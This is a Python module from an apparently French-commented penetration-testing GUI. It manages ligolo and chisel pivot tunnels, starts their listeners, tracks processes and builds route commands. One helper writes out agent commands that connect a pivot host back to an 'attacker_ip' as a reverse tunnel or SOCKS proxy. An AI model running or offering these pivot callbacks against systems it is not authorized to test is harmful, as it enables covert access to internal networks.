"""Tunnel Manager — pivots ligolo/chisel/ssh.

Hypothèses minimales : l'utilisateur fournit les binaires (ligolo-proxy,
chisel). On les lance, on tracke les PIDs. On gère les routes que
l'utilisateur ajoute (syncable avec Scope Manager) en affichant les
commandes associées (`ip route add`) à copier.

Pas d'automatisation dangereuse : on ne crée pas de règles `ip route`
nous-mêmes (sudo requis). On affiche la commande, l'utilisateur colle.
"""

from __future__ import annotations

import os
import shutil
import subprocess
import threading
import time
import uuid
from dataclasses import dataclass, field
from typing import Dict, List, Optional

from PyQt5.QtCore import QObject, pyqtSignal

from .logger import get_logger
from .process_tracker import ProcessTracker, pid_exists
from .scope_manager import ScopeManager

log = get_logger(__name__)


@dataclass
class Tunnel:
    id: str
    kind: str                   # ligolo / chisel / ssh / socat
    pid: int
    label: str
    listen_port: int = 0
    agent_host: str = ""
    started_at: float = field(default_factory=time.time)
    routes: List[str] = field(default_factory=list)     # CIDRs


class TunnelManager(QObject):
    tunnel_started = pyqtSignal(object)
    tunnel_stopped = pyqtSignal(str)
    tunnels_changed = pyqtSignal()
    route_added = pyqtSignal(str, str)     # tunnel_id, cidr
    route_removed = pyqtSignal(str, str)

    def __init__(
        self,
        process_tracker: ProcessTracker,
        scope_manager: Optional[ScopeManager] = None,
        parent=None,
    ):
        super().__init__(parent)
        self._pt = process_tracker
        self._scope = scope_manager
        self._tunnels: Dict[str, Tunnel] = {}
        self._monitor_stop = threading.Event()
        self._monitor = threading.Thread(
            target=self._monitor_loop, daemon=True, name="tunnel-monitor"
        )
        self._monitor.start()

    # ----------------------------------------------------------

    def all(self) -> List[Tunnel]:
        return list(self._tunnels.values())

    def start_ligolo(self, listen_port: int = 11601, self_signed: bool = True) -> Tunnel:
        binary = shutil.which("ligolo-proxy") or shutil.which("proxy")
        if not binary:
            raise RuntimeError("ligolo-proxy binary not found in PATH")
        cmd = [binary, "-selfcert" if self_signed else "", "-laddr", f"0.0.0.0:{listen_port}"]
        cmd = [c for c in cmd if c]
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            preexec_fn=os.setsid if hasattr(os, "setsid") else None,
        )
        return self._register(proc, "ligolo", f"ligolo:{listen_port}", listen_port)

    def start_chisel_server(self, listen_port: int = 8000) -> Tunnel:
        binary = shutil.which("chisel")
        if not binary:
            raise RuntimeError("chisel binary not found")
        cmd = [binary, "server", "--reverse", "-p", str(listen_port)]
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            preexec_fn=os.setsid if hasattr(os, "setsid") else None,
        )
        return self._register(proc, "chisel", f"chisel:{listen_port}", listen_port)

    def start_custom(self, cmd: List[str], label: str, listen_port: int = 0) -> Tunnel:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            preexec_fn=os.setsid if hasattr(os, "setsid") else None,
        )
        return self._register(proc, "custom", label, listen_port)

    def _register(
        self,
        proc: subprocess.Popen,
        kind: str,
        label: str,
        listen_port: int,
    ) -> Tunnel:
        tid = f"tun_{uuid.uuid4().hex[:8]}"
        t = Tunnel(
            id=tid, kind=kind, pid=proc.pid, label=label, listen_port=listen_port,
        )
        self._tunnels[tid] = t
        self._pt.register(
            pid=proc.pid, name=label, category="tunnel",
            command=label, port=listen_port,
        )
        log.info("Tunnel %s started (pid=%d, port=%d)", kind, proc.pid, listen_port)
        self.tunnel_started.emit(t)
        self.tunnels_changed.emit()
        return t

    def stop(self, tid: str) -> bool:
        t = self._tunnels.get(tid)
        if t is None:
            return False
        killed = self._pt.kill(t.pid)
        self._tunnels.pop(tid, None)
        self.tunnel_stopped.emit(tid)
        self.tunnels_changed.emit()
        log.info("Tunnel %s stopped (killed=%s)", tid, killed)
        return killed

    def stop_all(self) -> None:
        for tid in list(self._tunnels.keys()):
            self.stop(tid)

    def shutdown(self) -> None:
        self._monitor_stop.set()
        self.stop_all()

    # ---------- routes ----------

    def add_route(self, tunnel_id: str, cidr: str, sync_scope: bool = True) -> None:
        t = self._tunnels.get(tunnel_id)
        if t is None:
            raise KeyError(tunnel_id)
        if cidr in t.routes:
            return
        t.routes.append(cidr)
        self.route_added.emit(tunnel_id, cidr)
        self.tunnels_changed.emit()
        if sync_scope and self._scope:
            try:
                self._scope.add_subnet(cidr, label=f"via {t.label}")
            except ValueError as exc:
                # déjà existant, ok
                log.debug("Scope already has %s: %s", cidr, exc)

    def remove_route(self, tunnel_id: str, cidr: str) -> None:
        t = self._tunnels.get(tunnel_id)
        if t is None:
            return
        if cidr in t.routes:
            t.routes.remove(cidr)
            self.route_removed.emit(tunnel_id, cidr)
            self.tunnels_changed.emit()

    # ---------- commandes pour l'utilisateur ----------

    def build_route_command(self, cidr: str, iface: str = "ligolo") -> str:
        return f"sudo ip route add {cidr} dev {iface}"

    def build_agent_command(self, kind: str, attacker_ip: str, listen_port: int) -> str:
        """Commande à lancer sur le pivot pour rejoindre le proxy."""
        if kind == "ligolo":
            return f"./agent -connect {attacker_ip}:{listen_port} -ignore-cert"
        if kind == "chisel":
            return f"./chisel client {attacker_ip}:{listen_port} R:socks"
        return "# kind non supporté pour la génération de commande agent"

    # ----------------------------------------------------------

    def _monitor_loop(self) -> None:
        while not self._monitor_stop.wait(3.0):
            dead: List[str] = []
            for tid, t in list(self._tunnels.items()):
                if not pid_exists(t.pid):
                    dead.append(tid)
            for tid in dead:
                t = self._tunnels.pop(tid, None)
                if t:
                    self._pt.unregister(t.pid)
                self.tunnel_stopped.emit(tid)
                self.tunnels_changed.emit()
                log.info("Tunnel %s died externally", tid)
